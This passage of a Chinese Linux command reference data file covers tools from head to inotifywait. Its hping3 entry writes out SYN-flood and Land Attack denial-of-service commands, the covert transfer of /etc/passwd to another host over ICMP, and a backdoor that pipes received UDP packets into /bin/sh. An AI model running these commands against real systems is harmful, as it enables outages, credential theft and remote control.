语法  \n\n```\nhead(选项)(参数)\n```\n\n### 选项  \n\n```\n-n\u003c数字\u003e：指定显示头部内容的行数；\n-c\u003c字符数\u003e：指定显示头部内容的字符数；\n-v：总是显示文件名的头信息；\n-q：不显示文件名的头信息。\n```\n\n### 参数  \n\n文件列表：指定显示头部内容的文件列表。\n\n\n"},{"name":"help","categoryId":0,"data":"help\n\u003d\u003d\u003d\n\n显示帮助信息\n\n## 补充说明\n\n**help命令** 用于显示shell内部命令的帮助信息。help命令只能显示shell内部的命令帮助信息。而对于外部命令的帮助信息只能使用man或者info命令查看。\n\n### 语法  \n\n```\nhelp(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：输出短格式的帮助信息。仅包括命令格式。\n```\n\n### 参数  \n\n内部命令：指定需要显示帮助信息的shell内部命令。\n\n### 实例  \n\n使用help命令显示shell内部shopt命令的帮助信息，输入如下命令：\n\n```\nhelp shopt                #获取shopt命令的帮助信息\nshopt: shopt [-pqsu] [-o long-option] optname [optname...]\n    Toggle the values of variables controlling optional behavior.\n    The -s flag means to enable (set) each OPTNAME; the -u flag\n    unsets each OPTNAME.  The -q flag suppresses output; the exit\n    status indicates whether each OPTNAME is set or unset.  The -o\n    option restricts the OPTNAMEs to those defined for use with\n    `set -o\u0027.  With no options, or with the -p option, a list of all\n    settable options is displayed, with an indication of whether or\n    not each is set.\n```\n\n\n"},{"name":"hexdump","categoryId":0,"data":"hexdump\n\u003d\u003d\u003d\n\n显示文件十六进制格式\n\n## 补充说明\n\n**hexdump命令** 一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。\n\n### 语法  \n\n```\nhexdump [选项] [文件]...\n```\n\n### 选项  \n\n```\n-n length 只格式化输入文件的前length个字节。\n-C 输出规范的十六进制和ASCII码。\n-b 单字节八进制显示。\n-c 单字节字符显示。\n-d 双字节十进制显示。\n-o 双字节八进制显示。\n-x 双字节十六进制显示。\n-s 从偏移量开始输出。\n-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：\u0027a/b \"format1\" \"format2\"\u0027。\n```\n\n每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a\u003eb，且b只能为1，2，4，另外a可以省略，省略则a\u003d1。format1和format2中可以使用类似printf的格式字符串，如：\n\n```\n%02d：两位十进制\n%03x：三位十六进制\n%02o：两位八进制\n%c：单个字符等\n```\n\n还有一些特殊的用法：\n\n```\n%_ad：标记下一个输出字节的序号，用十进制表示。\n%_ax：标记下一个输出字节的序号，用十六进制表示。\n%_ao：标记下一个输出字节的序号，用八进制表示。\n%_p：对不能以常规字符显示的用 . 代替。\n```\n\n同一行如果要显示多个格式字符串，则可以跟多个`-e`选项。\n\n### 实例  \n\n```\nhexdump -e \u002716/1 \"%02X \" \"  |  \"\u0027 -e \u002716/1 \"%_p\" \"\\n\"\u0027 test\n00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ................  \n10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |  ................  \n20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |   !\"#$%\u0026\u0027()*+,-./ \n```\n\n\n"},{"name":"history","categoryId":0,"data":"history\n\u003d\u003d\u003d\n\n用于显示历史命令\n\n## 补充说明\n\n**history命令** 用于显示指定数目的指令命令，读取历史命令文件中的目录到历史命令缓冲区和将历史命令缓冲区中的目录写入命令文件。\n\n该命令单独使用时，仅显示历史命令，在命令行中，可以使用符号`!`执行指定序号的历史命令。例如，要执行第2个历史命令，则输入`!2`。\n\n历史命令是被保存在内存中的，当退出或者登录shell时，会自动保存或读取。在内存中，历史命令仅能够存储1000条历史命令，该数量是由环境变量`HISTSIZE`进行控制。\n\n### 语法  \n\n```\nhistory(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：清空当前历史命令；\n-a：将历史命令缓冲区中命令写入历史命令文件中；\n-r：将历史命令文件中的命令读入当前历史命令缓冲区；\n-w：将当前历史命令缓冲区命令写入历史命令文件中。\n```\n\n### 参数  \n\nn：打印最近的n条历史命令。\n\n### 实例  \n\n使用history命令显示最近使用的10条历史命令，输入如下命令：\n\n```\n[root@localhost ~]# history 10\n   92  ls\n   93  cd ..\n   94  ls\n   95  exit\n   96  ls -a\n   97  cd .ssh/\n   98  ls\n   99  cat known_hosts\n  100  exit\n  101  history 10\n```\n\n\n"},{"name":"hostid","categoryId":0,"data":"hostid\n\u003d\u003d\u003d\n\n用来打印当前主机的数字化标识\n\n## 补充说明\n\n**hostid命令** 用于打印当前主机的十六进制数字标识。是主机的唯一标识，是被用来限时软件的使用权限，不可改变。\n\n### 语法  \n\n```\nhostid\n```\n\n### 选项  \n\n```\n--help：显示帮助信息；\n--version：显示版本信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# hostid\n007f0100\n```\n\n\n"},{"name":"hping3","categoryId":0,"data":"hping3\n\u003d\u003d\u003d\n\n测试网络及主机的安全\n\n## 补充说明\n\n**hping** 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。\n\n### 安装  \n\n```\nyum install libpcap-devel tc-devel\nln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h\nwget http://www.hping.org/hping3-20051105.tar.gz\ntar zxvf hping3-20051105.tar.gz\ncd hping3-20051105\n./configure\nmake\nmake install\n```\n\n### 选项  \n\n```\n-H --help 显示帮助。\n-v -VERSION 版本信息。\n-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。\n-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。\n-n -nmeric 数字输出，象征性输出主机地址。\n-q -quiet 退出。\n-I --interface interface name 无非就是eth0之类的参数。\n-v --verbose 显示很多信息，TCP回应一般如：len\u003d46 ip\u003d192.168.1.1 flags\u003dRADF seq\u003d0 ttl\u003d255 id\u003d0 win\u003d0 rtt\u003d0.4ms tos\u003d0 iplen\u003d40 seq\u003d0 ack\u003d1380893504 sum\u003d2010 urp\u003d0\n-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）\n-z --bind 快捷键的使用。\n-Z --unbind 消除快捷键。\n-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。\n-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。\n-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。\n-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。\n-a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。\n-t --ttl time to live 可以指定发出包的TTL值。\n-H --ipproto 在RAW IP模式里选择IP协议。\n-w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。\n-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。\n-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。\n-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。\n-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。\n-G --fragoff fragment offset value set the fragment offset\n-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。\n-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。\n-C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。\n-K --ICMPCODE CODE 指定ICMP代号，缺省0。\n--icmp-ipver 把IP版本也插入IP头。\n--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。\n--icmp-iplen 设置IP包长度。\n--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。\n--icmp-ipproto 设置协议的，缺省是TCP。\n-icmp-cksum 设置校验和。\n-icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests)\n--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)\n-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。\n-p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。\n--keep 上面说过了。\n-w --win 发的大小和windows一样大，64BYTE。\n-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.\n-m --tcpseq 设置TCP序列数。\n-l --tcpck 设置TCP ack。\n-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。\n```\n\n### Hping3功能  \n\nHping3主要有以下典型功能应用：\n\n####  防火墙测试  \n\n使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html\n\n测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。\n\n```\nhping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10\n```\n\n#### 端口扫描  \n\nHping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：\n\n```\nhping3 -I eth0  -S 192.168.10.1 -p 80\n```\n\n其中`-I eth0`指定使用eth0端口，`-S`指定TCP包的标志位SYN，`-p 80`指定探测的目的端口。\n\nhping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。\n\n#### Idle扫描  \n\nIdle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。\n\n该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。\n\n#### 拒绝服务攻击  \n\n使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。\n\n```\nhping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000\n```\n\n其他攻击如smurf、teardrop、land attack等也很容易构建出来。\n\n#### 文件传输  \n\nHping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：\n\n```\nhping3 192.168.1.159--listen signature --safe  --icmp\n```\n\n监听ICMP包中的签名，根据签名解析出文件内容。\n\n在发送端使用签名打包的ICMP包发送文件：\n\n```\nhping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd\n```\n\n将`/etc/passwd`密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。\n\n#### 木马功能  \n\n如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。\n\n示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。\n\n在木马启动端：\n\n```\nhping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\n```\n\n在远程控制端：\n\n```\necho ls \u003etest.cmd\nhping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\n```\n\n将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。\n\n当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。\n\n\n"},{"name":"htdigest","categoryId":0,"data":"htdigest\n\u003d\u003d\u003d\n\nApache服务器内置工具\n\n## 补充说明\n\n**htdigest命令** 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用于摘要认证的密码文件。\n\n### 语法  \n\n```\nhtdigest(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：创建密码文件。\n```\n\n### 参数  \n\n*   密码文件：指定要创建或更新的密码文件；\n*   域：指定用户名所属的域；\n*   用户名：要创建或者更新的用户名。\n\n\n"},{"name":"htop","categoryId":0,"data":"htop\n\u003d\u003d\u003d\n\n[非内部命令]一个互动的进程查看器，可以动态观察系统进程状况。\n\n## 补充说明\n\nhtop命令 是Linux系统中的一个互动的进程查看器，一个文本模式的应用程序(在控制台或者X终端中)，需要ncurses。\n\n与Linux传统的top相比，htop更加人性化。它可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。\n\n与top相比，htop有以下优点：\n\n- 可以横向或纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。\n- 在启动上，比top 更快。\n- 杀进程时不需要输入进程号。\n- htop 支持鼠标操作。\n- 两者相比起来，top比较繁琐。\n\ntop缺点：\n\n- 只支持键盘操作。\n- 显示也单调。\n\nhtop 官网：http://htop.sourceforge.net/\n\n### 语法  \n\n```\nhtop\n```\n\n### 参数\n\n```\n-C --no-color               使用单色配色方案\n-d --delay\u003dDELAY            设置更新之间的延迟，在十秒\n-s --sort-key\u003dCOLUMN        纵列排序(try --sort-key\u003dhelp for a list)\n-u --user\u003dUSERNAME          只显示一个指定用户的进程\n-p --pid\u003dPID,[,PID,PID...]  只显示给用户\n-h --help                   打印此命令帮助\n-v --version                打印版本信息\n```\n\n### 选项  \n\n```\nh,?     F1：查看htop使用说明\nS       F2：设置\n/       F3：搜索进程\n\\       F4：过滤器，按关键字搜索\nt       F5：显示树形结构\n\u003c,\u003e     F6：选择排序方式\n[       F7：减少nice值，这样就可以提高对应进程的优先级\n]       F8：增加nice值，这样可以降低对应进程的优先级\nk       F9：杀掉选中的进程\nq       F10：退出htop\n\n\n/ : 搜索字符\nh : 显示帮助\nl : 显示进程打开的文件: 如果安装了lsof，按此键可以显示进程所打开的文件\nu : 显示所有用户，并可以选择某一特定用户的进程\nU : 取消标记所有的进程\ns : 将调用strace追踪进程的系统调用\nt : 显示树形结构\n\nH：显示/隐藏用户线程\nI：倒转排序顺序\nK：显示/隐藏内核线程    \nM：按内存占用排序\nP：按CPU排序    \nT：按运行时间排序\n\n上下键或PgUP， PgDn : 移动选中进程  \n左右键或Home， End : 移动列表  \nSpace(空格) : 标记/取消标记一个进程。命令可以作用于多个进程，例如 \"kill\"，将应用于所有已标记的进程  \n\n```\n\n\n### Htop设定\n\n鼠标点击Setup或者按下F2 之后进入htop 设定的页面\n\n#### 1. Meters\n\n设定顶端的 显示信息，分为左右两侧，Left column 表示左侧的显示的信息，Right column表示右侧显示的信息，如果要新加选项，可以选择Available meters添加，F5新增到上方左侧，F6新增到上方右侧。Left column和Right column下面的选项，可以选定信息的显示方式，有LED、Bar(进度条)、Text(文本模式)，可以根据个人喜好进行设置\n\n#### 2. Display options\n\n选择要显示的内容，按空格 x表示显示，选择完后，按F10保存\n\n#### 3. Colors\n\n设定界面以什么颜色来显示，个人认为用处不大，各人喜好不同\n\n#### 4. Colums\n\n作用是增加或取消要显示的各项内容，选择后F7(向上移动)、F8(向下移动)、F9(取消显示、F10(保存更改))此处增加了PPID、PGRP，根据各人需求，显示那些信息。\n\n**F3 搜索进程**\n\n在界面下按F3或直接输入”/”就可以直接进入搜索模式，是按照进程名进行搜索的，搜索到的进程会用设定的颜色标记出来，方便查看。\n\n**F4：过滤器**\n\n相当于模糊查找，不区分大小写，下方输入要搜索的内容后，则界面只显示搜索到的内容，更加方便查看\n\n**F5:以树形方式显示**\n\n\n**F6：排序方式**\n\n按下F6后会跳转至以树形方式显示界面，让您选择以什么方式进行排序，在Sort by下选择您要以什么来排序\n\n**F7，F8：调整进程nice值**\n\nF7表示减小nice值(增大优先级)，F8增大nice值(减小优先级)，选择某一进程，按F7或F8来增大或减小nice值，nice值范围为-20-19\n\n\n**F9：杀死进程**\n\n选择某一进程按F9即可杀死此进程，很方便\n\n**F10:退出htop**\n\n\n"},{"name":"htpasswd","categoryId":0,"data":"htpasswd\n\u003d\u003d\u003d\n\napache服务器创建密码认证文件\n\n## 补充说明\n\n**htpasswd命令** 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用户基本认证的密码文件。\n\n### 语法  \n\n### htpasswd(选项)(参数)  \n\n### 选项  \n\n```\n-c：创建一个加密文件；\n-n：不更新加密文件，只将加密后的用户名密码显示在屏幕上；\n-m：默认采用MD5算法对密码进行加密；\n-d：采用CRYPT算法对密码进行加密；\n-p：不对密码进行进行加密，即明文密码；\n-s：采用SHA算法对密码进行加密；\n-b：在命令行中一并输入用户名和密码而不是根据提示输入密码；\n-D：删除指定的用户。\n```\n\n### 参数  \n\n*   用户：要创建或者更新密码的用户名；\n*   密码：用户的新密码。\n\n### 实例  \n\n **利用htpasswd命令添加用户** \n\n```\nhtpasswd -bc .passwd www.jsdig.com php\n```\n\n在bin目录下生成一个.passwd文件，用户名www.jsdig.com，密码：php，默认采用MD5加密方式。\n\n **在原有密码文件中增加下一个用户** \n\n```\nhtpasswd -b .passwd Jack 123456\n```\n\n去掉`-c`选项，即可在第一个用户之后添加第二个用户，依此类推。\n\n **不更新密码文件，只显示加密后的用户名和密码** \n\n```\nhtpasswd -nb Jack 123456\n```\n\n不更新.passwd文件，只在屏幕上输出用户名和经过加密后的密码。\n\n **利用htpasswd命令删除用户名和密码** \n\n```\nhtpasswd -D .passwd Jack\n```\n\n **利用htpasswd命令修改密码** \n\n```\nhtpasswd -D .passwd Jack\nhtpasswd -b .passwd Jack 123456\n```\n\n即先使用htpasswd删除命令删除指定用户，再利用htpasswd添加用户命令创建用户即可实现修改密码的功能。\n\n\n"},{"name":"hwclock","categoryId":4,"data":"hwclock\n\u003d\u003d\u003d\n\n显示与设定硬件时钟\n\n## 补充说明\n\n**hwclock命令** 是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。\n\n在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。\n\n### 语法  \n\n```\nhwclock(选项)\n```\n\n### 选项  \n\n```\n--adjust：hwclock每次更改硬件时钟时，都会记录在/etc/adjtime文件中。使用--adjust参数，可使hwclock根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟；\n--debug：显示hwclock执行时详细的信息；\n--directisa：hwclock预设从/dev/rtc设备来存取硬件时钟。若无法存取时，可用此参数直接以I/O指令来存取硬件时钟；\n--hctosys：将系统时钟调整为与目前的硬件时钟一致；\n--set --date\u003d\u003c日期与时间\u003e：设定硬件时钟；\n--show：显示硬件时钟的时间与日期；\n--systohc：将硬件时钟调整为与目前的系统时钟一致；\n--test：仅测试程序，而不会实际更改硬件时钟；\n--utc：若要使用格林威治时间，请加入此参数，hwclock会执行转换的工作；\n--version：显示版本信息。\n```\n\n### 实例  \n\n设置硬件时间要依赖于操作系统时间，具体方法如下：\n\n```\nhwclock –systohc\nhwclock --systohc –-utc\n```\n\n不加任何参数使用hwclock，可以查看当前的硬件日期和时间。\n\n```\nhwclock\n```\n\n查看clock文件，确认是否设置了UTC：\n\n```\ncat /etc/default/rcS \nUTC\u003dyes\n```\n\n在其他一些版本的Linux（如RebHat）中可以这样查看：\n\n```\ncat /etc/sysconfig/clock\nZONE\u003d\"America/Los_Angeles\"\nUTC\u003dfalse\nARC\u003dfalse\n```\n\n\n"},{"name":"iconv","categoryId":0,"data":"iconv\n\u003d\u003d\u003d\n\n转换文件的编码方式\n\n## 补充说明\n\n**iconv命令** 是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码，反过来也行。JDK中也提供了类似的工具native2ascii。Linux下的iconv开发库包括iconv_open,iconv_close,iconv等C函数，可以用来在C/C++程序中很方便的转换字符编码，这在抓取网页的程序中很有用处，而iconv命令在调试此类程序时用得着。\n\n### 语法  \n\n```\niconv -f encoding [-t encoding] [inputfile]... \n```\n\n### 选项  \n\n```\n-f encoding :把字符从encoding编码开始转换。 \n-t encoding :把字符转换到encoding编码。 \n-l :列出已知的编码字符集合 \n-o file :指定输出文件 \n-c :忽略输出的非法字符 \n-s :禁止警告信息，但不是错误信息 \n--verbose :显示进度信息 \n-f和-t所能指定的合法字符在-l选项的命令里面都列出来了。 \n```\n\n### 实例  \n\n列出当前支持的字符编码： \n\n```\niconv -l \n```\n\n将文件file1转码，转后文件输出到fil2中： \n\n```\niconv file1 -f EUC-JP-MS -t UTF-8 -o file2 \n```\n\n这里，没`-o`那么会输出到标准输出。\n\n\n"},{"name":"id","categoryId":2,"data":"id\n\u003d\u003d\u003d\n\n显示用户的ID以及所属群组的ID\n\n## 补充说明\n\n**id命令** 可以显示真实有效的用户ID(UID)和组ID(GID)。UID 是对一个用户的单一身份标识。组ID（GID）则对应多个UID。id命令已经默认预装在大多数Linux系统中。要使用它，只需要在你的控制台输入id。不带选项输入id会显示如下。结果会使用活跃用户。\n\n当我们想知道某个用户的UID和GID时id命令是非常有用的。一些程序可能需要UID/GID来运行。id使我们更加容易地找出用户的UID以GID而不必在`/etc/group`文件中搜寻。如往常一样，你可以在控制台输入`man id`进入id的手册页来获取更多的详情。\n\n### 语法  \n\n```\nid [-gGnru]--[help][--version][用户名称]\n```\n\n### 选项  \n\n```\n-g或--group 　 显示用户所属群组的ID。\n-G或--groups   显示用户所属附加群组的ID。\n-n或--name 　  显示用户，所属群组或附加群组的名称。\n-r或--real 　  显示实际ID。\n-u或--user 　  显示用户ID。\n-help 　       显示帮助。\n-version 　    显示版本信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# id\nuid\u003d0(root) gid\u003d0(root) groups\u003d0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n\n解释：用户root的UID号码 \u003d 0，GID号码 \u003d 0。用户root是下面组的成员：\n\n*   root组GID号是：0\n*   bin组GID号是：1\n*   daemon组GID号是：2\n*   sys组GID号是：3\n*   adm组GID号是：4\n*   disk组GID号是：6\n*   wheel组GID号是：10\n\n打印用户名、UID 和该用户所属的所有组，要这么做，我们可以使用 -a 选项：\n\n```\n[root@localhost ~]# id -a\nuid\u003d0(root) gid\u003d0(root) groups\u003d0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n\n输出所有不同的组ID ，有效的，真实的和补充的，我们可以使用 -G 选项来实现：\n\n```\n[root@localhost ~]# id -G\n0 1 2 3 4 6 10\n```\n\n结果只会显示GID号。你可以和`/etc/group`文件比较。下面是`/etc/group`文件的示例内容：\n\n只输出有效的组ID，通过使用 -g 选项来只输出有效组ID：\n\n```\n[root@localhost ~]# id -g\n0\n```\n\n输出特定用户信息，我们可以输出特定的用户信息相关的UID和GID。只需要在id命令后跟上用户名：\n\n```\n[root@localhost ~]# id www\nuid\u003d500(www) gid\u003d500(www) groups\u003d500(www)\n```\n\n\n"},{"name":"ifcfg","categoryId":0,"data":"ifcfg\n\u003d\u003d\u003d\n\n置Linux中的网络接口参数\n\n## 补充说明\n\n**ifcfg命令** 是一个Bash脚本程序，用来设置Linux中的网络接口参数。\n\n### 语法  \n\n```\nifcfg(参数)\n```\n\n### 参数  \n\n```\n网络接口：指定要操作的网络接口；\nadd/del：添加或删除网络接口上的地址；\nip地址：指定IP地址和子网掩码；\nStop：停用指定的网络接口的IP地址。\n```\n\n\n"},{"name":"indent","categoryId":6,"data":"indent\n\u003d\u003d\u003d\n\n格式化C语言的源文件\n\n## 补充说明\n\n**indent命令** 可辨识C的原始代码文件，并加以格式化，以方便程序员阅读、修改等操作。\n\n### 语法  \n\n```\nindent(选项)(源文件)\n或\nindent（选项)(源文件)(-o 目标文件)\n```\n\n### 选项  \n\n```\n-bad：在声明区加上空白行；\n-bap：添加空白行；\n-bbb：在注释后面添加空白行；\n-bc：在声明段中，如果出现逗号就换行；\n-bl：if（或是else、for等）与后面执行区段的“{”不同行，且“}”自成一行-bli\u003c缩排格数\u003e设置{}缩排的格数；\n-br：if（或是else、for等）与后面执行区段的“{”同行，且“}”自成一行；\n-bs：在sizeof之后空一格；\n-c\u003c栏数\u003e：将注释置于程序右侧指定的栏位；\n-cd\u003c栏数\u003e：将注释置于声明右侧指定的栏位；\n-cdb：注释符号自成一行；\n-ce：将else置于“}”（if执行区段的结尾）之后；\n-ci：\u003c缩排格数\u003e：叙述过长而换行时，指定换行后缩排的格数；\n-cli\u003c缩排格数\u003e：使用case时，switch缩排的格数；\n-cp\u003c栏数\u003e：将注释置于else与elseif叙述右侧指定的栏位；\n-cs：在case之后空一格；\n-d\u003c缩排格数\u003e：针对不是放在程序码右侧的注释，设置其缩排格数；\n-di\u003c栏数\u003e：将声明区段的变量置于指定的栏位；\n-fc1：针对放在每行最前端的注释，设置其格式；\n-fca：设置所有注释的格式；\n-gnu：使用指定的GNU格式，该参数为默认值；\n-i\u003c格数\u003e：设置缩排的格数；\n-ip\u003c格数\u003e：设置参数的缩排格数；\n-kr：指定使用Kernighan\u0026Ritchie的格式；\n-lp：叙述过长而换行，且叙述中包含了括号时，将括号中的每行起始栏位内容垂直对其排列；\n-nbad：在声明区段后不要加上空白行；\n-nbap：在程序后面不添加空白行；\n-nbbb：在注释段后面不添加空白行；\n-nbc：在声明段中，即使出现逗号，也不换行；\n-ncdb：注释符号不自成一行；\n-nce：不将else置于“}”后面；\n-ncs：不在case后面空一格；\n-nfc1：不要格式化放在每行最前端的注释；\n-nfca：不用格式化任何的注释；\n-nip：参数不要缩排；\n-nlp：叙述过长而换行，且叙述中包含了括号时，不用将括号中的每行起始栏位垂直对其排列；\n-npcs：在调用函数名之后，不要添加空格；\n-npro：不要读取indent的配置文件“.indent.pro”；\n-npsl：程序类型与程序名称放在同一行；\n-nsc：注释左侧不要添加星号；\n-nsob：不用处理多余的空白行；\n-nss：若for或while区段仅有一行时，在分号前不加空格；\n-nv：不显示详细的信息；\n-orig：使用berkeley格式；\n-pcs：在调用函数名与“{”之间添加空格；\n-psl：程序类型置于程序名称的前一行；\n-sc：在每行注释左侧添加星号；\n-sob：删除多余的空白行；\n-ss：若for或swile区段仅有一行时，在分号前加上空格；\n-st：将结果显示在标准输出设备上；\n-T：数据类型名称缩排；\n-ts\u003c格数\u003e：设置tab的长度；\n-v：显示详细的执行过程；\n--version：显示版本信息。\n```\n\n### 实例  \n\n使用indent命令将C语言源文件\"test.c\"中所有的sizeof后面添加一个空格，输入如下命令：\n\n```\nindent -bs /home/rootlocal/桌面/test.c\n```\n\n执行上面的命令后，用户可以打开指定的源文件查看在sizeof后面是否都添加了一个空格。由于该命令的参数非常多，所以用户可以根据实际需要选择适合的参数进行使用即可。\n\n\n"},{"name":"init","categoryId":0,"data":"init\n\u003d\u003d\u003d\n\ninit进程是所有Linux进程的父进程\n\n## 补充说明\n\n**init命令** 是Linux下的进程初始化工具，init进程是所有Linux进程的父进程，它的进程号为1。init命令是Linux操作系统中不可缺少的程序之一，init进程是Linux内核引导运行的，是系统中的第一个进程。\n\n### 语法  \n\n```\ninit(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：不执行相关脚本而直接进入单用户模式；\n-s：切换到单用户模式。\n```\n\n### 参数  \n\n运行等级：指定Linux系统要切换到的运行等级。\n\n### 实例  \n\n几个常用的命令\n\n查看系统进程命令：`ps -ef | head`  \n查看init的配置文件：`more /etc/inittab`  \n查看系统当前运行的级别：`runlevel`\n\n **运行级别** \n\n到底什么是运行级呢？简单的说，运行级就是操作系统当前正在运行的功能级别。这个级别从0到6 ，具有不同的功能。你也可以在`/etc/inittab`中查看它的英文介绍。\n\n```\n#0  停机（千万不能把initdefault 设置为0）\n#1  单用户模式\n#2  多用户，没有 NFS(和级别3相似，会停止部分服务)\n#3  完全多用户模式\n#4  没有用到\n#5  x11(Xwindow)\n#6  重新启动（千万不要把initdefault 设置为6）\n```\n\n\n"},{"name":"inotifywait","categoryId":0,"data":"inotifywait\n\u003d\u003d\u003d\n\n异步文件系统监控机制\n\n## 补充说明\n\n**Inotify** 一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。。\n\n **inotify-tools** 是一个C库和一组命令行的工作提供Linux下inotify的简单接口。inotify-tools安装后会得到`inotifywait`和`inotifywatch`这两条命令：\n\n*    **inotifywait命令** 